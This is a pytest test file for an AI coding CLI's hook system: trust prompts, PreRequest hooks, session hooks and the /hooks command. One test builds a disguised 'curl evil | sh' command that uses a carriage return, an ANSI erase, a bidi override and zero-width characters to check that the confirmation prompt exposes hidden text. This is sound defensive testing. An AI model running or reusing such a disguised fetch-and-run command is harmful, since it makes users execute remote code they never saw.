"""Хуки в CLI: подтверждение хуков, PreRequest, хуки сессии в REPL и -p, /hooks."""

from __future__ import annotations

import json
import os
import shlex
import sys
from collections.abc import Callable
from pathlib import Path

import httpx
import pytest
from fakes import ScriptedProvider, text_turn
from test_gigacode import BASE, CHAT, CONFIG, Backend, token_file, write_token

from gigacrew.agent.chat_store import ChatRecorder, ChatStore
from gigacrew.agent.loop import Agent
from gigacrew.cli import app
from gigacrew.cli.commands import CommandContext, default_commands
from gigacrew.cli.hooks import describe_groups, describe_hooks, load_hooks
from gigacrew.cli.repl import run_repl
from gigacrew.config import Config
from gigacrew.llm.gigacode import GigaCodeProvider
from gigacrew.project.settings import (
    HookCommand,
    HookEvent,
    HookGroup,
    TrustStore,
    load_settings,
    user_fingerprint,
)
from gigacrew.project.workspace import Workspace, user_settings_file
from gigacrew.tools.base import build_default_registry
from gigacrew.ui.console import Console

pytestmark = pytest.mark.skipif(os.name != "posix", reason="команды хуков — через /bin/sh")

EVENTS = ("SessionStart", "SessionEnd", "UserPromptSubmit", "Stop")

# Фикстура oneshot из conftest.py: ``oneshot(provider)`` подменяет провайдера для -p.
_OneShot = Callable[[ScriptedProvider | None], None]


def _logging_hooks(tmp_path: Path, *, block_prompt: bool = False) -> dict[str, object]:
    """Настройки: каждое событие пишет «событие:источник/причина» в events.log."""
    script = tmp_path / "hook.py"
    events_log = str(tmp_path / "events.log")
    blocker = ""
    if block_prompt:
        blocker = (
            "if d['hook_event_name'] == 'UserPromptSubmit':\n"
            "    print('секреты нельзя', file=sys.stderr); sys.exit(2)\n"
        )
    script.write_text(
        "import json, sys\n"
        "d = json.load(sys.stdin)\n"
        "tag = d.get('source') or d.get('reason') or ''\n"
        f"open({events_log!r}, 'a').write(f\"{{d['hook_event_name']}}:{{tag}}\\n\")\n"
        f"{blocker}",
        encoding="utf-8",
    )
    cmd = f"{shlex.quote(sys.executable)} {shlex.quote(str(script))}"
    group = [{"hooks": [{"type": "command", "command": cmd}]}]
    return {"hooks": dict.fromkeys(EVENTS, group)}


def _trust_user_hooks(tmp_path: Path) -> None:
    """Подтвердить текущие хуки ~/.gigacode/settings.json (как ответ «да» раньше)."""
    settings, _ = load_settings(Workspace(tmp_path))
    TrustStore().trust_user(user_fingerprint(settings))


def _text(out: str) -> str:
    """Вывод в одну строку: Rich переносит длинные строки по ширине терминала."""
    return " ".join(out.split())


def _reader(*answers: str | BaseException) -> Callable[[], str]:
    queue = list(answers)

    def read() -> str:
        answer = queue.pop(0)
        if isinstance(answer, BaseException):
            raise answer
        return answer

    return read


def _recording_ask(asked: list[str]) -> Callable[..., bool]:
    """Подмена Console.ask: запоминает вопрос в ``asked`` и отвечает «да»."""

    def ask(question: str, *, dangerous: bool = False) -> bool:
        asked.append(question)
        return True

    return ask


def _write(path: Path, settings: dict[str, object]) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(settings), encoding="utf-8")


def _log(tmp_path: Path) -> list[str]:
    path = tmp_path / "events.log"
    return path.read_text().split() if path.exists() else []


def _main(tmp_path: Path, *extra: str) -> int:
    return app.main(["-C", str(tmp_path), "-p", "привет", "--no-color", "--no-stream", *extra])


# ------------------------------- -p ------------------------------- #
def test_oneshot_skips_untrusted_project_hooks(
    tmp_path: Path,
    oneshot: _OneShot,
    capsys: pytest.CaptureFixture[str],
) -> None:
    _write(Workspace(tmp_path).settings_file, _logging_hooks(tmp_path))
    oneshot(ScriptedProvider([text_turn("ок")]))
    assert _main(tmp_path) == 0
    assert "хуки проекта" in _text(capsys.readouterr().out)
    assert _log(tmp_path) == []


def test_oneshot_trust_hooks_flag(tmp_path: Path, oneshot: _OneShot) -> None:
    _write(Workspace(tmp_path).settings_file, _logging_hooks(tmp_path))
    oneshot(ScriptedProvider([text_turn("ок")]))
    assert _main(tmp_path, "--trust-hooks") == 0
    assert _log(tmp_path) == [
        "SessionStart:startup",
        "UserPromptSubmit:",
        "Stop:",
        "SessionEnd:other",
    ]
    assert not TrustStore().path.exists()  # флаг не запоминает подтверждение


def test_oneshot_skips_untrusted_user_hooks(
    tmp_path: Path,
    oneshot: _OneShot,
    capsys: pytest.CaptureFixture[str],
) -> None:
    _write(user_settings_file(), _logging_hooks(tmp_path))
    oneshot(ScriptedProvider([text_turn("ок")]))
    assert _main(tmp_path) == 0
    out = _text(capsys.readouterr().out)
    assert "хуки пользователя (~/.gigacode/settings.json) не подтверждены" in out
    assert _log(tmp_path) == []


def test_oneshot_skips_both_untrusted_owners(
    tmp_path: Path,
    oneshot: _OneShot,
    capsys: pytest.CaptureFixture[str],
) -> None:
    _write(user_settings_file(), _logging_hooks(tmp_path))
    _write(Workspace(tmp_path).settings_file, _logging_hooks(tmp_path))
    oneshot(ScriptedProvider([text_turn("ок")]))
    assert _main(tmp_path) == 0
    out = _text(capsys.readouterr().out)
    assert "хуки пользователя и проекта" in out
    assert "~/.gigacode/settings.json, .gigacode/settings.json" in out
    assert _log(tmp_path) == []


def test_oneshot_trusted_user_hooks_run(tmp_path: Path, oneshot: _OneShot) -> None:
    _write(user_settings_file(), _logging_hooks(tmp_path))
    _trust_user_hooks(tmp_path)
    oneshot(ScriptedProvider([text_turn("ок")]))
    assert _main(tmp_path) == 0
    assert _log(tmp_path)[0] == "SessionStart:startup"


def test_oneshot_prompt_blocked(
    tmp_path: Path,
    oneshot: _OneShot,
    capsys: pytest.CaptureFixture[str],
) -> None:
    _write(user_settings_file(), _logging_hooks(tmp_path, block_prompt=True))
    _trust_user_hooks(tmp_path)
    provider = ScriptedProvider([text_turn("ок")])
    oneshot(provider)
    assert _main(tmp_path) == app.EXIT_STOPPED
    assert "запрос отклонён хуком UserPromptSubmit: секреты нельзя" in capsys.readouterr().out
    assert provider.calls == 0
    assert _log(tmp_path)[-1] == "SessionEnd:other"


# ---------------------------- PreRequest ---------------------------- #
def _request_hooks(
    tmp_path: Path,
    *,
    block: bool = False,
    token: str = "",
) -> dict[str, object]:
    """PreRequest пишет «вид:причина» в requests.log; ``token`` — записать новый токен."""
    script = tmp_path / "request_hook.py"
    requests_log = str(tmp_path / "requests.log")
    refresh = ""
    if token:
        token_json = token_file(token)
        refresh = f"open(d['token_file'], 'w').write(json.dumps({token_json!r}))\n"
    stop = ""
    if block:
        stop = "print('VPN не подключён', file=sys.stderr); sys.exit(2)\n"
    script.write_text(
        "import json, sys\n"
        "d = json.load(sys.stdin)\n"
        f"open({requests_log!r}, 'a').write(f\"{{d['request']}}:{{d['reason']}}\\n\")\n"
        f"{refresh}{stop}",
        encoding="utf-8",
    )
    cmd = f"{shlex.quote(sys.executable)} {shlex.quote(str(script))}"
    return {"hooks": {"PreRequest": [{"hooks": [{"type": "command", "command": cmd}]}]}}


@pytest.fixture
def gigacode(tmp_path: Path, oneshot: _OneShot, monkeypatch: pytest.MonkeyPatch) -> Backend:
    """-p против бэкенда GigaCode на подменном транспорте; возвращает бэкенд."""
    oneshot(None)
    monkeypatch.setenv("GIGACREW_PROVIDER", "gigacode")
    monkeypatch.setenv("GIGACREW_API_URL", BASE)
    monkeypatch.setenv("GIGACREW_USER_AGENT", "test-agent/1.0")
    monkeypatch.setenv("GIGACREW_MODEL", "coder")
    monkeypatch.setenv("GIGACODE_HOME", str(tmp_path / "cli-home"))
    write_token(tmp_path, "tok-1")
    backend = Backend(valid=("tok-1", "tok-2"))
    monkeypatch.setattr(
        app,
        "_make_provider",
        lambda cfg: GigaCodeProvider(cfg, transport=httpx.MockTransport(backend.handler)),
    )
    return backend


def _requests_log(tmp_path: Path) -> list[str]:
    path = tmp_path / "requests.log"
    return path.read_text().split() if path.exists() else []


def test_pre_request_before_every_gigacode_request(tmp_path: Path, gigacode: Backend) -> None:
    _write(Workspace(tmp_path).settings_file, _request_hooks(tmp_path))
    assert _main(tmp_path, "--trust-hooks") == 0
    assert _requests_log(tmp_path) == ["config:request", "chat:request"]
    assert gigacode.count(CONFIG) == 1
    assert gigacode.count(CHAT) == 1


def test_pre_request_refreshes_token(tmp_path: Path, gigacode: Backend) -> None:
    gigacode.valid = {"tok-2"}  # tok-1 из файла бэкенд уже не принимает
    _write(Workspace(tmp_path).settings_file, _request_hooks(tmp_path, token="tok-2"))
    assert _main(tmp_path, "--trust-hooks") == 0
    assert gigacode.requests[-1].headers["Authorization"] == "Bearer tok-2"


def test_pre_request_block_stops_request(
    tmp_path: Path,
    gigacode: Backend,
    capsys: pytest.CaptureFixture[str],
) -> None:
    _write(Workspace(tmp_path).settings_file, _request_hooks(tmp_path, block=True))
    assert _main(tmp_path, "--trust-hooks") == app.EXIT_LLM_ERROR
    assert "остановлен хуком PreRequest: VPN не подключён" in _text(capsys.readouterr().out)
    assert gigacode.requests == []


def test_pre_request_not_installed_for_api_provider(tmp_path: Path, oneshot: _OneShot) -> None:
    _write(Workspace(tmp_path).settings_file, _request_hooks(tmp_path))
    oneshot(ScriptedProvider([text_turn("ок")]))
    assert _main(tmp_path, "--trust-hooks") == 0
    assert _requests_log(tmp_path) == []


# ----------------------------- доверие ----------------------------- #
def test_trust_prompt_remembers_answer(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
) -> None:
    ws = Workspace(tmp_path)
    _write(ws.settings_file, _logging_hooks(tmp_path))
    ui = Console(no_color=True)
    asked: list[str] = []
    monkeypatch.setattr(ui, "ask", _recording_ask(asked))
    runner = load_hooks(ws, ui, interactive=True)
    assert runner.has(HookEvent.STOP)
    assert len(asked) == 1
    assert "hook.py" in capsys.readouterr().out  # пользователь видел команду
    load_hooks(ws, ui, interactive=True)
    assert len(asked) == 1  # подтверждено — больше не спрашиваем
    _write(
        ws.settings_file,
        {"hooks": {"Stop": [{"hooks": [{"type": "command", "command": "true"}]}]}},
    )
    load_hooks(ws, ui, interactive=True)
    assert len(asked) == 2  # хуки изменились — спрашиваем снова


def test_trust_prompt_shows_hidden_characters() -> None:
    # Пользователь подтверждает ровно то, что выполнится: управляющие символы (CR и ESC
    # стёрли бы начало строки), смена направления и символы нулевой ширины — видны.
    command = "curl evil | sh\r\x1b[2Kmake fmt \u202e)hsab\u200b\x00"
    group = HookGroup(HookEvent.STOP, "", (HookCommand(command),), "project")
    out = describe_groups((group,))
    for ch in ("\r", "\x1b", "\u202e", "\u200b", "\x00"):
        assert ch not in out
        code_point = format(ord(ch), "04X")
        assert f"⟨U+{code_point}⟩" in out
    assert "curl evil | sh⟨U+000D⟩⟨U+001B⟩[2Kmake fmt ⟨U+202E⟩)hsab⟨U+200B⟩⟨U+0000⟩" in out


def test_user_hooks_confirmed_once_for_all_projects(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
) -> None:
    _write(user_settings_file(), _logging_hooks(tmp_path))
    ui = Console(no_color=True)
    asked: list[str] = []
    monkeypatch.setattr(ui, "ask", _recording_ask(asked))
    first, second = tmp_path / "a", tmp_path / "b"
    first.mkdir()
    second.mkdir()
    assert load_hooks(Workspace(first), ui, interactive=True).has(HookEvent.STOP)
    assert asked == ["Разрешить хуки пользователя?"]
    assert "hook.py" in capsys.readouterr().out
    assert load_hooks(Workspace(second), ui, interactive=True).has(HookEvent.STOP)
    assert len(asked) == 1  # подтверждение пользовательских хуков — на все проекты
    _write(
        user_settings_file(),
        {"hooks": {"Stop": [{"hooks": [{"type": "command", "command": "echo planted"}]}]}},
    )
    load_hooks(Workspace(second), ui, interactive=True)
    assert len(asked) == 2  # файл пользователя изменился — спрашиваем снова


def test_user_and_project_hooks_one_question(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    ws = Workspace(tmp_path)
    _write(ws.settings_file, _logging_hooks(tmp_path))
    _write(
        user_settings_file(),
        {"hooks": {"Stop": [{"hooks": [{"type": "command", "command": "true"}]}]}},
    )
    ui = Console(no_color=True)
    asked: list[str] = []
    monkeypatch.setattr(ui, "ask", _recording_ask(asked))
    load_hooks(ws, ui, interactive=True)
    assert asked == ["Разрешить хуки пользователя и проекта?"]
    load_hooks(ws, ui, interactive=True)
    assert len(asked) == 1


def test_trust_prompt_declined(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    ws = Workspace(tmp_path)
    _write(ws.settings_file, _logging_hooks(tmp_path))
    _write(
        user_settings_file(),
        {"hooks": {"Stop": [{"hooks": [{"type": "command", "command": "true"}]}]}},
    )
    _trust_user_hooks(tmp_path)  # хуки пользователя подтверждены раньше
    ui = Console(no_color=True)
    monkeypatch.setattr(ui, "ask", lambda question, dangerous=False: False)
    runner = load_hooks(ws, ui, interactive=True)
    assert [hook.command for hook in runner.settings.commands(HookEvent.STOP)] == ["true"]
    assert not runner.has(HookEvent.SESSION_START)


@pytest.mark.parametrize("interactive", [True, False])
@pytest.mark.parametrize("owners", [("user",), ("project",), ("user", "project")])
def test_unconfirmed_hooks_of_every_owner_are_skipped(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    owners: tuple[str, ...],
    *,
    interactive: bool,
) -> None:
    # Отказ (или -p) выключает хуки всех неподтверждённых владельцев, а не только первого.
    ws = Workspace(tmp_path)
    files = {"user": user_settings_file(), "project": ws.settings_file}
    for owner in owners:
        _write(
            files[owner],
            {"hooks": {"Stop": [{"hooks": [{"type": "command", "command": owner}]}]}},
        )
    ui = Console(no_color=True)
    monkeypatch.setattr(ui, "ask", lambda question, dangerous=False: False)
    runner = load_hooks(ws, ui, interactive=interactive)
    assert runner.settings.commands(HookEvent.STOP) == []


def test_disabled_hooks_ask_nothing(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    ws = Workspace(tmp_path)
    _write(ws.settings_file, _logging_hooks(tmp_path))
    _write(user_settings_file(), {"disableAllHooks": True})
    ui = Console(no_color=True)
    asked: list[str] = []
    monkeypatch.setattr(ui, "ask", _recording_ask(asked))
    runner = load_hooks(ws, ui, interactive=True)
    assert asked == []
    assert not runner.has(HookEvent.STOP)
    assert describe_hooks(runner.settings).startswith("хуки выключены (disableAllHooks)")


def test_project_cannot_disable_trusted_user_hooks(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    ws = Workspace(tmp_path)
    _write(
        user_settings_file(),
        {"hooks": {"PreToolUse": [{"hooks": [{"type": "command", "command": "guard"}]}]}},
    )
    _trust_user_hooks(tmp_path)
    _write(ws.settings_file, {"disableAllHooks": True})
    ui = Console(no_color=True)
    monkeypatch.setattr(ui, "ask", lambda question, dangerous=False: pytest.fail(question))
    runner = load_hooks(ws, ui, interactive=True)
    assert runner.has(HookEvent.PRE_TOOL_USE, "run_shell")
    text = describe_hooks(runner.settings)
    assert "хуки проекта выключены" in text
    assert "guard" in text


# ------------------------------- REPL ------------------------------- #
@pytest.fixture
def hooked_repl(tmp_path: Path) -> tuple[Agent, Console, ChatRecorder, ScriptedProvider]:
    _write(user_settings_file(), _logging_hooks(tmp_path))
    _trust_user_hooks(tmp_path)
    cfg = Config(access_key="x", project_root=tmp_path, stream=False, auto_approve=True)
    ui = Console(no_color=True)
    hooks = load_hooks(Workspace(tmp_path), ui, interactive=False)
    provider = ScriptedProvider()
    agent = Agent(provider, build_default_registry(), cfg, ui, hooks=hooks)
    chats = ChatRecorder(ChatStore(agent.workspace))
    agent.chat_id = chats.chat_id
    return agent, ui, chats, provider


def test_repl_session_hooks(
    tmp_path: Path,
    hooked_repl: tuple[Agent, Console, ChatRecorder, ScriptedProvider],
) -> None:
    agent, ui, chats, _provider = hooked_repl
    read = _reader("привет", "/clear", "/exit")
    assert (
        run_repl(agent, ui, default_commands(), read_input=read, chats=chats, index_on_start=False)
        == 0
    )
    assert _log(tmp_path) == [
        "SessionStart:startup",
        "UserPromptSubmit:",
        "Stop:",
        "SessionEnd:clear",
        "SessionStart:clear",
        "SessionEnd:prompt_input_exit",
    ]


def test_repl_session_end_on_ctrl_d(
    tmp_path: Path,
    hooked_repl: tuple[Agent, Console, ChatRecorder, ScriptedProvider],
) -> None:
    agent, ui, chats, _ = hooked_repl
    read = _reader(EOFError())
    run_repl(agent, ui, default_commands(), read_input=read, chats=chats, index_on_start=False)
    assert _log(tmp_path)[-1] == "SessionEnd:prompt_input_exit"


def test_repl_prompt_blocked_keeps_running(
    tmp_path: Path,
    capsys: pytest.CaptureFixture[str],
) -> None:
    _write(user_settings_file(), _logging_hooks(tmp_path, block_prompt=True))
    _trust_user_hooks(tmp_path)
    cfg = Config(access_key="x", project_root=tmp_path, stream=False, auto_approve=True)
    ui = Console(no_color=True)
    provider = ScriptedProvider([text_turn("ответ")])
    hooks = load_hooks(Workspace(tmp_path), ui, interactive=False)
    agent = Agent(provider, build_default_registry(), cfg, ui, hooks=hooks)
    read = _reader("пароль 123", "/exit")
    assert run_repl(agent, ui, default_commands(), read_input=read, index_on_start=False) == 0
    assert "запрос отклонён хуком UserPromptSubmit" in capsys.readouterr().out
    assert provider.calls == 0
    assert len(agent.conversation) == 0


def test_hooks_command_lists_and_reloads(
    tmp_path: Path,
    capsys: pytest.CaptureFixture[str],
) -> None:
    cfg = Config(access_key="x", project_root=tmp_path, stream=False, auto_approve=True)
    ui = Console(no_color=True)
    agent = Agent(ScriptedProvider(), build_default_registry(), cfg, ui)
    commands = default_commands()
    ctx = CommandContext(agent=agent, ui=ui, commands=commands, trust_hooks=True)
    commands.dispatch("/hooks", ctx)
    assert "хуков нет" in capsys.readouterr().out
    _write(
        user_settings_file(),
        {
            "hooks": {
                "PreToolUse": [
                    {
                        "matcher": "run_shell",
                        "hooks": [{"type": "command", "command": "./check.sh"}],
                    },
                ],
            },
        },
    )
    commands.dispatch("/hooks reload", ctx)
    out = capsys.readouterr().out
    assert "перечитаны" in out
    assert "PreToolUse" in out
    assert "[run_shell] ./check.sh" in out
    assert agent.hooks.has(HookEvent.PRE_TOOL_USE, "run_shell")
    commands.dispatch("/hooks что-то", ctx)
    assert "использование: /hooks [reload]" in capsys.readouterr().out
